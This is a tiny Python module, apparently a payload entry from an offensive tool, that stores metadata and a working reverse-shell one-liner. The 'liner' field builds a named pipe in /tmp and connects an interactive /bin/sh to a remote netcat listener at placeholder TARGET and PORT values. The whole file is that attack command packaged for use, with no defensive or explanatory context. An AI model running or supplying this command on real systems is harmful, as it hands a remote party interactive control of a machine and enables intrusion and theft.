class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses netcat and mkfifo to setup a reverse shell"
    function    = "reverse shell"
    liner       = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TARGET PORT >/tmp/f"""
